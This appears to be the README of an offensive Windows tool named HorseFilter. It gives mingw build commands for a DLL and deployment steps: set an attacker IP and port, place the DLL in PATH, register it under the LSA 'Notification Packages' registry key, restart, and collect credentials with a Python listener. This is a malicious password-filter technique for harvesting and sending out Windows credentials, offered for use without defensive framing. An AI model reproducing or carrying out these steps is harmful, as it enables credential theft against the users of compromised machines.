# HorseFilter

/* compile with:

x86_64-w64-mingw32-windres horsefilter.rc -o horsefilter.o
x86_64-w64-mingw32-gcc horsefilter.c horsefilter.o -o horsefilter.dll -shared -lws2_32

*/

// to use:
// change port and ip macros
// add compiled dll anywhere in PATH
// append dll name (no extension) to
//     "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages"
// and restart
// catch creds with horsefilter.py
